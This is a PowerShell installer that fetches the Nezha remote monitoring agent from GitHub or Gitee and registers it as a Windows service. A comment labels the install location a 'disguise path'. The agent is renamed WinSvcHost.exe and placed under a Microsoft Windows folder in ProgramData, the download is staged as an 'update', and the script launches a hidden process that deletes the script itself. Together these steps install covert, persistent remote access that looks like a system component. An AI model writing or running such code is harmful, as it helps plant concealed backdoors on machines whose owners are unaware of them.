# Download latest release from github
if($PSVersionTable.PSVersion.Major -lt 5){
    exit
}
$agentrepo = "nezhahq/agent"

# 伪装路径
$installPath = "C:\ProgramData\Microsoft\Windows\WinSvcHost"
$exeName = "WinSvcHost.exe"
$configName = "config.yml"
$zipPath = "C:\Windows\Temp\update.zip"
$tempPath = "C:\Windows\Temp\update"

#  x86 or x64 or arm64
if ([System.Environment]::Is64BitOperatingSystem) {
    if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") {
        $file = "nezha-agent_windows_arm64.zip"
    } else {
        $file = "nezha-agent_windows_amd64.zip"
    }
} else {
    $file = "nezha-agent_windows_386.zip"
}
$agentreleases = "https://api.github.com/repos/$agentrepo/releases"

# 清理旧版安装
if (Test-Path "$installPath\$exeName") {
    & "$installPath\$exeName" service uninstall 2>$null
    Start-Sleep -Seconds 2
    Remove-Item "$installPath" -Recurse -Force 2>$null
}
# 清理原版安装
if (Test-Path "C:\nezha\nezha-agent.exe") {
    C:\nezha\nezha-agent.exe service uninstall 2>$null
    Start-Sleep -Seconds 2
    Remove-Item "C:\nezha" -Recurse -Force 2>$null
}
# 清理C盘根目录残留的配置文件
if (Test-Path "C:\config.yml") { Remove-Item "C:\config.yml" -Force 2>$null }

# TLS/SSL
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$agenttag = (Invoke-WebRequest -Uri $agentreleases -UseBasicParsing | ConvertFrom-Json)[0].tag_name
if ([string]::IsNullOrWhiteSpace($agenttag)) {
    $optionUrl = "https://fastly.jsdelivr.net/gh/nezhahq/agent/"
    Try {
        $response = Invoke-WebRequest -Uri $optionUrl -UseBasicParsing -TimeoutSec 10
        if ($response.StatusCode -eq 200) {
            $versiontext = $response.Content | findstr /c:"option.value"
            $version = [regex]::Match($versiontext, "@(\d+\.\d+\.\d+)").Groups[1].Value
            $agenttag = "v" + $version
        }
    } Catch {
        $optionUrl = "https://gcore.jsdelivr.net/gh/nezhahq/agent/"
        $response = Invoke-WebRequest -Uri $optionUrl -UseBasicParsing -TimeoutSec 10
        if ($response.StatusCode -eq 200) {
            $versiontext = $response.Content | findstr /c:"option.value"
            $version = [regex]::Match($versiontext, "@(\d+\.\d+\.\d+)").Groups[1].Value
            $agenttag = "v" + $version
        }
    }
}

# Region判断
$region = "Unknown"
foreach ($url in ("https://dash.cloudflare.com/cdn-cgi/trace","https://1.0.0.1/cdn-cgi/trace")) {
    try {
        $ipapi = Invoke-RestMethod -Uri $url -TimeoutSec 5 -UseBasicParsing
        if ($ipapi -match "loc=(\w+)" ) {
            $region = $Matches[1]
            break
        }
    } catch {}
}

if($region -ne "CN"){
    $download = "https://github.com/$agentrepo/releases/download/$agenttag/$file"
}else{
    $download = "https://gitee.com/naibahq/agent/releases/download/$agenttag/$file"
}

# 下载
Invoke-WebRequest $download -OutFile $zipPath

# 解压并安装
Expand-Archive $zipPath -DestinationPath $tempPath -Force
if (!(Test-Path $installPath)) { New-Item -Path $installPath -type directory -Force | Out-Null }
Move-Item -Path "$tempPath\nezha-agent.exe" -Destination "$installPath\$exeName" -Force

# 清理下载文件
Remove-Item $zipPath -Force 2>$null
Remove-Item $tempPath -Recurse -Force 2>$null

# 安装服务 - 指定配置文件路径
& "$installPath\$exeName" service install -c "$installPath\$configName"

# 如果配置文件生成在C盘根目录，移动到安装目录
Start-Sleep -Seconds 2
if (Test-Path "C:\config.yml") {
    Move-Item "C:\config.yml" "$installPath\$configName" -Force 2>$null
}

# 自删除本脚本
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Start-Process powershell -ArgumentList "-Command Start-Sleep -Seconds 3; Remove-Item '$scriptPath' -Force" -WindowStyle Hidden
}

